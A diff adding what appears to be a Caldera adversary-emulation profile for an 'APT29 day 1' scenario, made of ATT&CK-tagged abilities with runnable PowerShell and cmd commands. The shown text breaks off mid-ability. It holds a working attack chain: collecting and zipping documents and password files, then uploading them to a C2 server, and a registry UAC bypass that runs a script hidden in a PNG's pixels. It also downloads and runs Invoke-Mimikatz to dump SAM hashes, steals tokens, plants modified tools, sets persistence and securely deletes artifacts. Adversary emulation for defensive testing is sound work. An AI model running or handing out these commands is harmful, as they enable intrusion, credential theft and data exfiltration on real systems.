@@ -1,0 +1,1219 @@
+id: 397be8b4-f879-44f7-ba7c-b37d6b2cd112
+name: APT29-day1
+description: ---
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- a5daa530-c640-49bc-aa54-6808789a684a
+- 5692da31-3586-4e4f-8f07-5750070c730b
+- ee08a427-1e1d-4d8a-aeb1-978a7fcf9087
+- 64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce
+- 35d95b64-c1f8-4ac7-a2f2-8959218239cd
+- 68e209dd-f354-4adc-8bc6-e85a3e55a7f4
+- 5df12481-9d8c-4235-b550-9cefc8ed7361
+- 41610306-087c-4c34-874b-37b8ed633a36
+- 2ff877b4-0c00-401e-9d3f-070c70b610df
+- 144b1384-5060-494f-80eb-91772695cdf3
+- d2ea2676-7f85-4228-b980-ab3c0e1adc03
+- 7c2a6e5b-1adb-464f-a581-4677391f8dd6
+- faa96e7f-081a-40b7-a743-a6a7f2627ea3
+- 26181249-be75-41ed-9fe7-5c30ea8c2d4d
+- 84377d7a-0363-44fd-a082-44657ca1858f
+- 61221fb9-cb32-46d5-98fd-90567a621526
+- 9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76
+- 5c23f638-9cfc-4fc4-9cab-4af628fef70a
+- 68b588bc-002a-42dc-bac7-9189f944065b
+- 1345bff7-6f26-43b2-a92a-9aabccdb3db0
+- 89e9dffa-8836-4672-8cf3-bebd006d2a2b
+- 5ff80022-8d85-410b-b868-6c7565b267e5
+- 4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d
+- 59592c35-8207-4896-8d8b-36ad4600245d
+- 24ed020e-4730-4000-b6b4-6b5d3e95314f
+- 5f4263c4-7ff1-4098-b5f5-f41faa31cf5b
+- 646be6c9-f27a-4f5f-be5d-b8a0317e215f
+- 9b5b5aec-32ff-4d74-8555-727b50ab15f6
+- 6f1f4768-7099-45d2-a858-b49dc792234e
+- ba0b398d-91b8-490a-bed2-f959afa8e1aa
+- effbedc1-1bc8-4a75-9395-980559700008
+- 45f18b58-c14f-4b61-a3da-41b67af21429
+- e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d
+- ef6abdb6-6e0a-4291-a391-4d8ebabf7f63
+- c4f4b13c-87b6-498c-b814-93570173068c
+- a4b14c10-49aa-4ae4-b165-d5a37364fe62
+- a81ea4ad-bc9f-49a7-82d4-4466df641487
+- ee4c2eab-be57-434c-a32c-14b77360301a
+- db28f68d-e8b8-46e6-b680-642570d4b257
+- a612311d-a802-48da-bb7f-88a4b9dd7a24
+- 92eccc5d-4e00-4d54-8ade-1f451d5219d2
+- a238d002-d34e-4ce2-921b-0f1cad0afa90
+- 95564347-e77a-4a89-b08f-dcafa5468f2c
+- c4a59e39-53b0-4ace-9528-8ff052752ece
+- fd639a42-a667-48ab-a883-2d94843e52ab
+- 0b1841bd-ef8b-475c-bce7-8fcb2860984a
+- 00e7c38f-f4e1-45ea-ac8c-464b31f46229
+- 08e57385-dbce-4850-8bb7-589ef79465ab
+- 2d18c8ec-4593-49dc-9bf4-11d0673d6ae6
+- 208b021b-c79a-4176-8ad1-3af99ed50c6f
+- 4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92
+- 09b6f339-cd57-4012-94e8-531be782fcea
+- 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe
+- 00446217-53ca-4749-bacd-f41fe189d36e
+abilities:
+ a5daa530-c640-49bc-aa54-6808789a684a:
+  name:  PowerShell
+  tactic:  execution
+  technique_name:  "Command and Scripting Interpreter: PowerShell"
+  technique_id:  T1059.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       powershell.exe;
+       if ($?) {
+         write-host "[*] PowerShell successfully spawned";
+         exit 0;
+       }
+ 5692da31-3586-4e4f-8f07-5750070c730b:
+  name:  Automated Collection
+  tactic:  collection
+  technique_name:  "Automated Collection"
+  technique_id:  T1119
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
+   - pwsh:
+     platform: windows
+     command: |
+       $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
+ ee08a427-1e1d-4d8a-aeb1-978a7fcf9087:
+  name:  System Network Configuration Discovery
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       ipconfig /all
+ 64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce:
+  name:  System Network Configuration Discovery
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       arp -a
+ 35d95b64-c1f8-4ac7-a2f2-8959218239cd:
+  name:  System Owner / User Discovery
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       echo %USERDOMAIN%\%USERNAME%
+ 68e209dd-f354-4adc-8bc6-e85a3e55a7f4:
+  name:  Data from staged fileand Exfiltration over C2 Channel
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over Command and Control Channel"
+  technique_id:  T1041
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module .\upload.ps1 -Verbose -Force;
+       Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/file/upload";
+   - pwsh:
+     platform: windows
+     command: |
+       Import-Module .\upload.ps1 -Verbose -Force;
+       Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/file/upload";
+ 5df12481-9d8c-4235-b550-9cefc8ed7361:
+  name:  Process Discovery
+  tactic:  discovery
+  technique_name:  "Process Discovery"
+  technique_id:  T1057
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module .\ps.ps1 -Verbose -Force;
+       ProcessList
+   - pwsh:
+     platform: windows
+     command: |
+       Import-Module .\ps.ps1 -Verbose -Force;
+       ProcessList
+ 41610306-087c-4c34-874b-37b8ed633a36:
+  name:  Process Discovery
+  tactic:  discovery
+  technique_name:  "Process Discovery"
+  technique_id:  T1057
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       tasklist /v
+ 2ff877b4-0c00-401e-9d3f-070c70b610df:
+  name:  System Service Discovery
+  tactic:  discovery
+  technique_name:  "System Service Discovery"
+  technique_id:  T1007
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       sc query
+ 144b1384-5060-494f-80eb-91772695cdf3:
+  name:  System Service Discovery
+  tactic:  discovery
+  technique_name:  "System Service Discovery"
+  technique_id:  T1007
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net start
+ d2ea2676-7f85-4228-b980-ab3c0e1adc03:
+  name:  System Information Discovery
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       systeminfo
+ 7c2a6e5b-1adb-464f-a581-4677391f8dd6:
+  name:  System Information Discovery
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net config workstation
+ faa96e7f-081a-40b7-a743-a6a7f2627ea3:
+  name:  Permissions Groups Discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery"
+  technique_id:  T1069
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net localgroup administrators
+ 26181249-be75-41ed-9fe7-5c30ea8c2d4d:
+  name:  Permissions Groups Discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery"
+  technique_id:  T1069
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net localgroup administrators /domain
+ 84377d7a-0363-44fd-a082-44657ca1858f:
+  name:  Permissions Groups Discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery"
+  technique_id:  T1069
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmd.exe /c net group "Domain Admins" /domain
+   - pwsh:
+     platform: windows
+     command: |
+       cmd.exe /c net group "Domain Admins" /domain
+ 61221fb9-cb32-46d5-98fd-90567a621526:
+  name:  Account Discovery
+  tactic:  discovery
+  technique_name:  "Account Discovery"
+  technique_id:  T1087
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net user /domain
+ 9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76:
+  name:  Account Discovery
+  tactic:  discovery
+  technique_name:  "Account Discovery"
+  technique_id:  T1087
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net user %USERNAME% /domain
+ 5c23f638-9cfc-4fc4-9cab-4af628fef70a:
+  name:  Query Registry
+  tactic:  discovery
+  technique_name:  "Query Registry"
+  technique_id:  T1012
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+ 68b588bc-002a-42dc-bac7-9189f944065b:
+  name:  Staging monkey PNG
+  tactic:  defensive-evasion
+  technique_name:  "Masquerading: Match Legitimate Name or Location"
+  technique_id:  T1036.005
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $username="#{profile_user}";
+       if ( $(test-path -path "C:\Users\$username\Downloads\monkey.png") -eq $false ) {
+         copy-item monkey.png -Destination "C:\Users\$username\Downloads\\" -Force;
+         if ($? -eq $True) {
+           write-host "[+] Successfully copied monkey.png!";
+           get-childitem -path "C:\Users\$username\Downloads\\";
+           exit 0;
+         } else {
+           write-host "[+] Failed to copy monkey.png.";
+           exit 1;
+         }
+       
+         } else {
+           write-host "[*] monkey.png already exists within C:\users\$username\Downloads..."
+         }
+   - pwsh:
+     platform: windows
+     command: |
+       $username="#{profile_user}";
+       if ( $(test-path -path "C:\Users\$username\Downloads\monkey.png") -eq $false ) {
+         copy-item monkey.png -Destination "C:\Users\$username\Downloads\\" -Force;
+         if ($? -eq $True) {
+           write-host "[+] Successfully copied monkey.png!";
+           get-childitem -path "C:\Users\$username\Downloads\\";
+           exit 0;
+         } else {
+           write-host "[+] Failed to copy monkey.png.";
+           exit 1;
+         }
+       
+         } else {
+           write-host "[*] monkey.png already exists within C:\users\$username\Downloads..."
+         }
+ 1345bff7-6f26-43b2-a92a-9aabccdb3db0:
+  name:  Bypass User Account Control
+  tactic:  privilege-escalation
+  technique_name:  "Access Token Manipulation: Token Impersonation/Theft"
+  technique_id:  T1134.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
+       Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+       $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
+       Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose
+   - pwsh:
+     platform: windows
+     command: |
+       Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
+       Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+       $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
+       Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose
+ 89e9dffa-8836-4672-8cf3-bebd006d2a2b:
+  name:  UAC Bypass via Backup Utility
+  tactic:  privilege-escalation
+  technique_name:  "Abuse Elevation Control Mechanism: Bypass User Account Control"
+  technique_id:  T1548.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       if (!(test-path -path $env:windir\system32\sdclt.exe)) {
+         write-host "[!] sdclt.exe was not found on this host.";
+         exit 1;
+       }
+       New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
+       New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
+       New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
+       New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
+       
+       $username="#{profile_user}";
+       $payload='powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName "System.Drawing"; $g=a System.Drawing.Bitmap("C:\Users\$($username)\Downloads\monkey.png");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"';
+       
+       Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value $payload -Force;
+       Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force;
+       
+       cmd.exe /c sdclt.exe;
+       cmd.exe /c powershell.exe;
+   - pwsh:
+     platform: windows
+     command: |
+       if (!(test-path -path $env:windir\system32\sdclt.exe)) {
+         write-host "[!] sdclt.exe was not found on this host.";
+         exit 1;
+       }
+       New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
+       New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
+       New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
+       New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
+       
+       $username="#{profile_user}";
+       $payload='powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName "System.Drawing"; $g=a System.Drawing.Bitmap("C:\Users\$($username)\Downloads\monkey.png");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"';
+       
+       Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value $payload -Force;
+       Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force;
+       
+       cmd.exe /c sdclt.exe;
+       cmd.exe /c powershell.exe;
+ 5ff80022-8d85-410b-b868-6c7565b267e5:
+  name:  Registry Cleanup for UAC Bypass Technique
+  tactic:  defensive-evasion
+  technique_name:  "Modify Registry"
+  technique_id:  T1112
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
+       if (!(test-path -path HKCU:\Software\Classes\Folder)) {
+         write-host "[+] Reg keys removed!";
+        }
+   - pwsh:
+     platform: windows
+     command: |
+       Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
+       if (!(test-path -path HKCU:\Software\Classes\Folder)) {
+         write-host "[+] Reg keys removed!";
+        }
+ 4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d:
+  name:  Planting Modified Sysinternals Utilities
+  tactic:  stage-capabilities
+  technique_name:  "Masquerading: Match Legitimate Name or Location"
+  technique_id:  T1036.005
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       iwr -uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -outfile SysInternalsSuite.zip;
+       Expand-Archive -Path SysInternalsSuite.zip -DestinationPath "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -Force;
+       
+       if (! $?) {
+         write-host "Error moving files to #{profile_user}\Downloads";
+         exit 1;
+       }
+       
+       Move-Item Modified-SysInternalsSuite.zip "C:\Users\#{profile_user}\Downloads" -Force;
+       Expand-Archive -LiteralPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -DestinationPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -Force;
+       
+       if (! $?) {
+         write-host "Error expanding files to #{profile_user}\Downloads";
+         exit 1;
+       }
+       
+       $dir_exists=Test-Path -path "C:\Program Files\SysInternalsSuite";
+       if ($dir_exists -eq $true) {
+         write-host "[*] SysInternalsSuite folder exists within \"C:\Program Files\", copying over payloads then removing folder from Downloads.";
+         Move-Item -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+         Move-Item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+       } else {
+         mkdir "C:\Program Files\SysInternalsSuite";
+         Copy-Item -Path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+         Copy-Item -Path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+       }
+       
+       if (test-path -path "SysInternalsSuite.zip") {
+         Remove-Item -path "filesystem::SysInternalsSuite.zip" -force;
+       }
+       
+       if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" ) {
+         remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -force;
+       }
+       
+       if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite") {
+         remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -recurse -force;
+       }
+       
+       if (test-path -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite") {
+         Remove-Item -path  "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -recurse -force;
+       }
+       
+       Set-Location -path "C:\Program Files\SysInternalsSuite";
+       if ($?) {
+         gci;
+         write-host "[*] Successfully planted files"
+       } else {
+         write-host "[!] Error downloading and planting modified system tools."
+       }
+   - pwsh:
+     platform: windows
+     command: |
+       iwr -uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -outfile SysInternalsSuite.zip;
+       Expand-Archive -Path SysInternalsSuite.zip -DestinationPath "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -Force;
+       
+       if (! $?) {
+         write-host "Error moving files to #{profile_user}\Downloads";
+         exit 1;
+       }
+       
+       Move-Item Modified-SysInternalsSuite.zip "C:\Users\#{profile_user}\Downloads" -Force;
+       Expand-Archive -LiteralPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -DestinationPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -Force;
+       
+       if (! $?) {
+         write-host "Error expanding files to #{profile_user}\Downloads";
+         exit 1;
+       }
+       
+       $dir_exists=Test-Path -path "C:\Program Files\SysInternalsSuite";
+       if ($dir_exists -eq $true) {
+         write-host "[*] SysInternalsSuite folder exists within \"C:\Program Files\", copying over payloads then removing folder from Downloads.";
+         Move-Item -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+         Move-Item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+       } else {
+         mkdir "C:\Program Files\SysInternalsSuite";
+         Copy-Item -Path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+         Copy-Item -Path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+       }
+       
+       if (test-path -path "SysInternalsSuite.zip") {
+         Remove-Item -path "filesystem::SysInternalsSuite.zip" -force;
+       }
+       
+       if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" ) {
+         remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -force;
+       }
+       
+       if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite") {
+         remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -recurse -force;
+       }
+       
+       if (test-path -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite") {
+         Remove-Item -path  "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -recurse -force;
+       }
+       
+       Set-Location -path "C:\Program Files\SysInternalsSuite";
+       if ($?) {
+         gci;
+         write-host "[*] Successfully planted files"
+       } else {
+         write-host "[!] Error downloading and planting modified system tools."
+       }
+ 59592c35-8207-4896-8d8b-36ad4600245d:
+  name:  Remote System Discovery
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmd.exe /c net group "Domain Controllers" /domain
+   - pwsh:
+     platform: windows
+     command: |
+       cmd.exe /c net group "Domain Controllers" /domain
+ 24ed020e-4730-4000-b6b4-6b5d3e95314f:
+  name:  Remote System Discovery
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmd.exe /c net group "Domain Computers" /domain
+   - pwsh:
+     platform: windows
+     command: |
+       cmd.exe /c net group "Domain Computers" /domain
+ 5f4263c4-7ff1-4098-b5f5-f41faa31cf5b:
+  name:  System Network Configuration Discovery
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       netsh advfirewall show allprofiles
+ 646be6c9-f27a-4f5f-be5d-b8a0317e215f:
+  name:  Process Discovery
+  tactic:  discovery
+  technique_name:  "Process Discovery"
+  technique_id:  T1057
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $ps = get-process;
+       write-output $ps;
+   - pwsh:
+     platform: windows
+     command: |
+       $ps = get-process;
+       write-output $ps;
+ 9b5b5aec-32ff-4d74-8555-727b50ab15f6:
+  name:  Artifact Cleanup - Delete Files
+  tactic:  defensive-evasion
+  technique_name:  "Indicator Removal on Host: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysInternalsSuite";)) {
+         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       Set-Location -path "C:\Program Files\SysInternalsSuite";
+       gci $env:userprofile\Desktop;
+       .\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\‮cod.3aka3.scr";
+       .\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip";
+       .\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysInternalsSuite.zip";
+   - pwsh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysInternalsSuite";)) {
+         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       Set-Location -path "C:\Program Files\SysInternalsSuite";
+       gci $env:userprofile\Desktop;
+       .\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\‮cod.3aka3.scr";
+       .\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip";
+       .\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysInternalsSuite.zip";
+ 6f1f4768-7099-45d2-a858-b49dc792234e:
+  name:  Loading Stage-2 & Performing Discovery
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       
+       Set-Location -path "C:\Program Files\SysInternalsSuite";
+       if (!(test-path ".\readme.ps1")) {
+         Move-Item .\readme.txt readme.ps1 -Force;
+       }
+       . .\readme.ps1;
+       Invoke-Discovery;
+   - pwsh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       
+       Set-Location -path "C:\Program Files\SysInternalsSuite";
+       if (!(test-path ".\readme.ps1")) {
+         Move-Item .\readme.txt readme.ps1 -Force;
+       }
+       . .\readme.ps1;
+       Invoke-Discovery;
+ ba0b398d-91b8-490a-bed2-f959afa8e1aa:
+  name:  4.C.2 - System Network Connections Discovery (T1049)
+  tactic:  discovery
+  technique_name:  "System Network Connections Discovery"
+  technique_id:  T1049
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       netstat -ano
+ effbedc1-1bc8-4a75-9395-980559700008:
+  name:  Credential Dumping using Process Injection
+  tactic:  credential-access
+  technique_name:  "Credential Dumping"
+  technique_id:  T1003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+       $web = (New-Object System.Net.WebClient);
+       $result = $web.DownloadString("https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1");
+       iex $result;
+       function hashdump
+       {
+           Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
+       };
+       hashdump;
+   - pwsh:
+     platform: windows
+     command: |
+       [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+       $web = (New-Object System.Net.WebClient);
+       $result = $web.DownloadString("https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1");
+       iex $result;
+       function hashdump
+       {
+           Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
+       };
+       hashdump;
+ 45f18b58-c14f-4b61-a3da-41b67af21429:
+  name:  Persistent Service 2
+  tactic:  persistence
+  technique_name:  "Boot or Logon Autostart Execution: Shortcut Modification"
+  technique_id:  T1547.009
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       if (Test-Path -path "readme.ps1") {
+         . .\readme.ps1;
+         Invoke-Persistence -PersistStep 2;
+         write-host "[+] Persistence 2 invoked.";
+       
+       } else {
+         write-host "[!] readme.ps1 not found.";
+         return 1;
+       }
+   - pwsh:
+     platform: windows
+     command: |
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       if (Test-Path -path "readme.ps1") {
+         . .\readme.ps1;
+         Invoke-Persistence -PersistStep 2;
+         write-host "[+] Persistence 2 invoked.";
+       
+       } else {
+         write-host "[!] readme.ps1 not found.";
+         return 1;
+       }
+ e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d:
+  name:  Credentials In Files- Chrome
+  tactic:  credential-access
+  technique_name:  "Credential Dumping"
+  technique_id:  T1003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       ./accesschk.exe -accepteula .;
+   - pwsh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       ./accesschk.exe -accepteula .;
+ ef6abdb6-6e0a-4291-a391-4d8ebabf7f63:
+  name:  Modified Query Registry (Modified)
+  tactic:  defensive-evasion
+  technique_name:  "Access Token Manipulation"
+  technique_id:  T1134
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "& {. '.\StealToken.ps1';
+       StealToken;
+       CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
+       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b \\#{remote.file.share}\C$ > C:\Users\Public\loot-dir.txt';
+       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE% > C:\Users\Public\loot-tree.txt';
+       RevertToSelf;}";
+ c4f4b13c-87b6-498c-b814-93570173068c:
+  name:  Credentials In Files (T1081) - Private Keys Extraction
+  tactic:  credential-access
+  technique_name:  "Unsecured Credentials: Private Keys"
+  technique_id:  T1552.004
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-PfxCertificate -Exportable -FilePath ".\dmevals.local.pfx" -CertStoreLocation Cert:\LocalMachine\My;
+       
+       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       . .\readme.ps1;
+       Get-PrivateKeys;
+       if ($? -eq $True) {
